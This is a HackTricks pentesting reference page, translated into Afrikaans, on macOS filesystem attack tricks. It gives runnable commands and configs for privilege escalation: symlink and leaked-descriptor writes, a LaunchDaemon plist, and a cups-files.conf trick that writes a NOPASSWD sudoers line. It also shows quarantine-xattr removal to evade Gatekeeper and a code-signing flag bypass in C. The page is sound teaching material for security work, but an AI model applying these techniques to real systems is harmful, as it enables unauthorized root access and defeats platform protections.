# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## POSIX-permissiekombinasies

Vir ’n **gids** beteken die drie toestemmingsbisse iets anders as op ’n gewone lêer. `chmod(1)` noem die uitvoerbis "**search**" wanneer dit op ’n gids toegepas word:<sup>[2]</sup>

> `0100` Vir lêers, laat uitvoering deur die eienaar toe. Vir gidse, laat die eienaar toe om in die gids te **search**.

- **read** - jy kan die gidsinskrywings **enumerate** (die name lys).
- **write** - jy kan inskrywings in die gids **create, rename and delete**. Let daarop dat dit ’n eienskap van die *bevattende* gids is, nie van die lêer nie: jy kan ’n lêer skrap wat jy nie kan lees of skryf nie, solank jy na sy ouergids kan skryf.
- Om ’n **subdirectory** te skrap, moet dit leeg wees, wat op sy beurt genoeg regte vereis om alles daarin te verwyder.
- As die gids die **sticky bit** (`S_ISVTX`, soos `/tmp`) het, word dit beperk — POSIX bepaal dat ’n proses dan slegs lêers daarin mag verwyder of hernoem as dit die lêer besit, die gids besit, of toepaslike voorregte het.<sup>[1]</sup>
- **execute / search** - jy word **allowed to traverse** die gids. Padnaamresolusie lokaliseer elke komponent "in the directory specified by its predecessor", dus maak die verlies van search-regte op enige enkele komponent van die padvoorvoegsel alles daaronder onbereikbaar per pad, selfs al is die blaarlêer self wêreldleesbaar.<sup>[1]</sup>

### Dangerous Combinations

**How to overwrite a file/folder owned by root**, but:

- One parent **directory owner** in the path is the user
- One parent **directory owner** in the path is a **users group** with **write access**
- A users **group** has **write** access to the **file**

Met enige van die vorige kombinasies kan ’n aanvaller ’n **sym/hard link** in die verwagte pad **inject** om ’n bevoorregte arbitrêre skryfbewerking te verkry.

### Folder root R+X special case

Dit volg direk uit die pathname-resolution-reël hierbo. As ’n **directory** slegs R+X aan root verleen, is die lêers daarin *by path* vir almal anders onbereikbaar — maar die **files' own permission bits may still be permissive**. Die gids is die enigste versperring.

Dus verander enige primitive waarmee jy die lêer **out of that directory** kan kry — ’n bevoorregte proses wat ’n pad wat deur ’n aanvaller gekies is na ’n ligging wat jy *can traverse* **moves/renames/copies** — in ’n arbitrêre leesbewerking, sonder dat jy ooit die lêer se eie modus hoef te omseil:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Soek na bevoorregte lêer-verskuifers (installeerders, log-roteerders, crash/diagnostiese versamelaars, rugsteun- en "export"-funksies) wat 'n bronpad vanaf 'n gebruiker met laer bevoorregting aanvaar.

## Symbolic Link / Hard Link

### Toegeeflike lêer/vouer

As 'n bevoorregte proses data skryf in 'n **file** wat deur 'n **lower privileged user** **controlled** kan word, of wat voorheen deur 'n gebruiker met laer bevoorregting **created** kon wees. Die gebruiker kan dit eenvoudig via 'n Symbolic of Hard link na 'n ander lêer **point**, en die bevoorregte proses sal na daardie lêer skryf.

Kyk in die ander afdelings waar 'n aanvaller 'n **arbitrary write to escalate privileges** kan **abuse**.

### Open `O_NOFOLLOW`

Volgens [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"As `O_NOFOLLOW` in die masker gebruik word en die teikenlêer wat aan `open()` oorgedra word 'n simboliese skakel is, sal `open()` misluk."* Slegs die **finale** komponent word nagegaan — elke **intermediate** komponent word steeds opgelos en gevolg. Dus kan 'n ontwikkelaar wat 'n skryfaksie met `O_NOFOLLOW` "beskerm" het, steeds aangeval word deur 'n simboliese skakel in enige **parent directory** van die teikenpad te plant.<sup>[3]</sup>

Dieselfde man-bladsy dokumenteer die vlae wat daardie gaping werklik sluit:<sup>[3]</sup>

- **`O_NOFOLLOW_ANY`** — *"as ... enige komponent van die pad wat aan `open()` oorgedra word 'n simboliese skakel is, sal `open()` misluk."*
- **`O_RESOLVE_BENEATH`** — *"as ... die gespesifiseerde padresolusie ontsnap uit die gids wat met die fd geassosieer word, sal `openat()` misluk."*

Andersins is `openat()` relatief tot 'n gids-FD wat jy reeds gevalideer het, of `realpath()` + herverifikasie, die oorblywende maniere om simboliese skakel-wisselings in die middel van die pad te voorkom.

## .fileloc

Lêers met die **`.fileloc`**-uitbreiding kan na ander toepassings of binaries wys, sodat die toepassing/binary uitgevoer sal word wanneer hulle oopgemaak word.\
Voorbeeld:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Lêerdeskripteurs

### Leak FD (geen `O_CLOEXEC`)

As 'n oproep na `open` nie die vlag `O_CLOEXEC` het nie, sal die lêerdeskriptor deur die child process geërf word. Dus, as 'n bevoorregte proses 'n bevoorregte lêer oopmaak en 'n proses uitvoer wat deur die aanvaller beheer word, sal die aanvaller die **FD na die bevoorregte lêer erf**.

Die kanonieke voorbeeld is die **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>

- `dyld` het `DYLD_PRINT_TO_FILE=/path` selfs in **restricted (suid root) binaries** gerespekteer, omdat daardie spesifieke veranderlike buite `processDyldEnvironmentVariable()` geparse is.
- Dit het `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)` uitgevoer, en dus **'n lêer wat deur root besit word op 'n arbitrêre pad geskep**.
- Die FD is **nooit toegemaak nie en het geen close-on-exec-vlag gehad nie**, dus het elke child van die suid binary 'n **skryfbare FD na 'n lêer wat deur root besit word, geërf**.
- Deur byvoorbeeld `DYLD_PRINT_TO_FILE=/etc/target suid_binary` uit te voer en daarna die geërfde FD-nommer in die child te lees, kon arbitrêre skrywings na lêers wat deur root besit word, gedoen word; `fcntl(fd, F_SETFL, 0)` het selfs `O_APPEND` verwyder om oorskryf in plaas van byvoeging toe te laat.

Dieselfde patroon verskyn wanneer 'n bevoorregte proses 'n lêer oopmaak **voordat** dit iets uitvoer wat jy beheer (helper tools, `crontab`-styl editors wat deur `$EDITOR` aangeroep word, log/debug-lêers wat vanaf 'n env-var-pad oopgemaak word...). Lys die FDs wat jy geërf het met:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Enigiets bo `2` wat na 'n lêer wys wat jy nie self kan oopmaak nie, is 'n arbitrary-write (of arbitrary-read) primitive.

## Vermy quarantine xattrs-truuks

### Verwyder dit
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

As 'n lêer/vouer hierdie immutable-attribuut het, sal dit nie moontlik wees om 'n xattr daarop te plaas nie
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Lêerstelsels sonder xattr-ondersteuning

Nie elke lêerstelsel wat macOS kan mount, stoor **extended attributes** van nature nie. HFS+ en APFS doen dit; **FAT32, exFAT en (die meeste) NFS-mounts doen dit nie** — macOS emuleer dit deur ’n **AppleDouble**-sy-lêer met die naam `._<filename>` te skryf ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>

Dit is belangrik vir quarantine, omdat die xattr slegs behoue bly as dit werklik op dieselfde volume geskryf **en teruggelees** kan word:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
As die volume later gelees word via ’n pad wat die `._`-metgesel ignoreer (of die metgesel verwyder word), arriveer die lêer **sonder ’n quarantine-vlag** — en ’n `.app` sonder quarantine is genoeg om uit die App Sandbox te ontsnap, soos bespreek in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Hierdie ACL verhoed dat `xattrs` by die lêer gevoeg word.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Die **AppleDouble**-lêerformaat kopieer ’n lêer insluitend sy ACEs.

In die [**bronkode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) is dit moontlik om te sien dat die ACL-teksvoorstelling wat binne die xattr genaamd **`com.apple.acl.text`** gestoor word, as ACL in die gedekomprimeerde lêer gestel gaan word. Dus, as jy ’n toepassing in ’n zip-lêer met die **AppleDouble**-lêerformaat saamgepers het met ’n ACL wat verhoed dat ander xattrs daarin geskryf word... is die quarantine xattr nie in die toepassing gestel nie:

Sien die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) vir meer inligting.<sup>[6]</sup>

Om dit te repliseer, moet ons eers die korrekte ACL-string kry:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Let daarop dat, selfs al werk dit, die sandbox eers die quarantine xattr skryf)

Nie regtig nodig nie, maar ek laat dit daar vir ingeval:

{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Om signature checks te omseil

### Om platform binaries checks te omseil

Sommige security checks kontroleer of die binary 'n **platform binary** is, byvoorbeeld om toe te laat dat daar aan 'n XPC service gekoppel word. Soos egter uiteengesit in 'n bypass by https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ is dit moontlik om hierdie check te omseil deur 'n platform binary (soos /bin/ls) te verkry en die exploit via dyld in te spuit deur die omgewingsveranderlike `DYLD_INSERT_LIBRARIES` te gebruik.<sup>[7]</sup>

### Om flags `CS_REQUIRE_LV` en `CS_FORCED_LV` te omseil

Dit is moontlik vir 'n uitvoerende binary om sy eie flags te wysig om checks te omseil met kode soos:<sup>[7]</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Omseil Code Signatures

Bundles bevat die lêer **`_CodeSignature/CodeResources`**, wat die **hash** van elke enkele **lêer** in die **bundle** bevat. Let daarop dat die hash van CodeResources ook **in die executable ingebed** is, dus kan ons ook nie daarmee peuter nie.

Daar is egter sommige lêers waarvan die signature nie nagegaan sal word nie; hierdie lêers het die sleutel `omit` in die plist, soos:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Dit is moontlik om die handtekening van ’n resource vanaf die cli te bereken met:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

’n Gebruiker kan selfs ’n pasgemaakte dmg wat geskep is bo-op sommige bestaande vouers mount. Só kan jy ’n pasgemaakte dmg-pakket met pasgemaakte inhoud skep:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Gewoonlik mount macOS skywe deur met die `com.apple.DiskArbitrarion.diskarbitrariond` Mach-diens te kommunikeer (verskaf deur `/usr/libexec/diskarbitrationd`). As die parameter `-d` by die LaunchDaemons plist-lêer gevoeg en dit herbegin word, sal dit logs in `/var/log/diskarbitrationd.log` stoor.\
Dit is egter moontlik om tools soos `hdik` en `hdiutil` te gebruik om direk met die `com.apple.driver.DiskImages` kext te kommunikeer.

## Arbitrêre skrywe

### Periodieke sh-skripte

As jou skrip as ’n **shell script** geïnterpreteer kan word, kan jy die **`/etc/periodic/daily/999.local`** shell script oorskryf, wat elke dag geaktiveer sal word.

Jy kan ’n **fake** uitvoering van hierdie skrip doen met: **`sudo periodic daily`**

### Daemons

Skryf ’n arbitrêre **LaunchDaemon** soos **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** met ’n plist wat ’n arbitrêre skrip uitvoer soos:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Genereer net die script `/Applications/Scripts/privesc.sh` met die **commands** wat jy as root wil uitvoer.

### Sudoers File

As jy **arbitrary write** het, kan jy 'n lêer binne die vouer **`/etc/sudoers.d/`** skep wat aan jouself **sudo**-privileges verleen.

### PATH files

Die lêer **`/etc/paths`** is een van die belangrikste plekke wat die PATH-omgewingsveranderlike vul. Jy moet root wees om dit te oorskryf, maar as 'n script van 'n **privileged process** enige **command sonder die volledige pad** uitvoer, kan jy dit moontlik **hijack** deur hierdie lêer te wysig.

Jy kan ook lêers in **`/etc/paths.d`** skryf om nuwe vouers in die `PATH`-omgewingsveranderlike te laai.

### cups-files.conf

Hierdie tegniek is in [this writeup](https://www.kandji.io/blog/macos-audit-story-part1) gebruik.<sup>[8]</sup>

Skep die lêer `/etc/cups/cups-files.conf` met die volgende inhoud:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Dit sal die lêer `/etc/sudoers.d/lpe` met permissies 777 skep. Die ekstra gemors aan die einde is om die skepping van die error log te aktiveer.

Skryf vervolgens die nodige config in `/etc/sudoers.d/lpe` om privileges te eskaleer, soos `%staff ALL=(ALL) NOPASSWD:ALL`.

Wysig dan die lêer `/etc/cups/cups-files.conf` weer en dui `LogFilePerm 700` aan, sodat die nuwe sudoers-lêer geldig word wanneer `cupsctl` aangeroep word.

### Sandbox Escape

Dit is moontlik om die macOS sandbox met 'n FS arbitrary write te ontsnap. Vir enkele voorbeelde, kyk na die bladsy [macOS Auto Start](../../../../macos-auto-start-locations.md), maar 'n algemene een is om 'n Terminal preferences-lêer in `~/Library/Preferences/com.apple.Terminal.plist` te skryf wat 'n command by startup uitvoer, en dit met `open` aan te roep.

## Genereer skryfbare lêers as ander gebruikers

'n Baie algemene privesc primitive is om 'n **bevoorregte process 'n lêer vir jou te laat skep** in 'n directory wat jy beheer, en dan **write access** tot daardie lêer te behou. Twee bestanddele word benodig:

1. 'n Directory wat jy besit (of waar jy 'n **inheritable ACL** kan stel), sodat enigiets wat daarin geskep word jou permissions erf.
2. 'n Bevoorregte/`suid` process wat aangesê kan word **waar** om 'n lêer te skep — tipies deur 'n debug/logging environment variable, 'n config-lêer of 'n helper se XPC API.

Die **inheritable ACL**-deel is wat die geskepte lêer skryfbaar vir jou maak, selfs al word dit deur 'n ander gebruiker besit. Die `file_inherit` / `directory_inherit` inheritance flags word in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) gedokumenteer:
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Nou is enige lêer wat ’n bevoorregte proses binne `$DIRNAME` skep, **skryfbaar deur jou**. As daardie gids ook ’n ligging is wat later **as root uitgevoer** word (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, ’n LaunchDaemon-gids...), is dit ’n direkte root escalation. Sien die [Sudoers File](#sudoers-file)- en [cups-files.conf](#cups-filesconf)-afdelings hierbo vir wat om te skryf sodra jy die lêer het.

Vir ’n volledige uitgewerkte voorbeeld van die `"env variable makes a root process create a file, and the FD leaks to you"`-ketting, sien [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) hierbo.

## POSIX Shared Memory

**POSIX shared memory** laat prosesse in POSIX-compliant operating systems toe om toegang tot ’n gemeenskaplike geheuearea te verkry, wat vinniger kommunikasie moontlik maak in vergelyking met ander inter-process communication-metodes. Dit behels die skep of oopmaak van ’n shared memory-object met `shm_open()`, die instelling van die grootte daarvan met `ftruncate()`, en die mapping daarvan na die proses se address space met behulp van `mmap()`. Prosesse kan dan direk uit hierdie geheuearea lees en daarna skryf. Om gelyktydige toegang te bestuur en data corruption te voorkom, word synchronization mechanisms soos mutexes of semaphores dikwels gebruik. Laastens unmap en close prosesse die shared memory met `munmap()` en `close()`, en verwyder hulle opsioneel die memory object met `shm_unlink()`. Hierdie stelsel is besonder effektief vir doeltreffende, vinnige IPC in omgewings waar verskeie prosesse vinnig toegang tot shared data moet verkry.

<details>

<summary>Producer Code Example</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Verbruikerskode-voorbeeld</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** is ’n sekuriteitskenmerk wat in macOS bekendgestel is om die veiligheid en betroubaarheid van **file descriptor-bewerkings** in gebruikerstoepassings te verbeter. Hierdie guarded descriptors bied ’n manier om spesifieke beperkings of “guards” met file descriptors te assosieer, wat deur die kernel afgedwing word.

Hierdie kenmerk is veral nuttig om sekere klasse sekuriteitskwesbaarhede, soos **ongemagtigde lêertoegang** of **race conditions**, te voorkom. Hierdie kwesbaarhede ontstaan byvoorbeeld wanneer ’n thread toegang tot ’n file description verkry en sodoende **’n ander kwesbare thread toegang daartoe gee**, of wanneer ’n file descriptor deur ’n kwesbare child process **geërf** word. Sommige funksies wat met hierdie funksionaliteit verband hou, is:

- `guarded_open_np`: Open ’n FD met ’n guard
- `guarded_close_np`: Maak dit toe
- `change_fdguard_np`: Verander guard-vlae op ’n descriptor (selfs om die guard-beskerming te verwyder)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (gelekte FD sonder close-on-exec)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
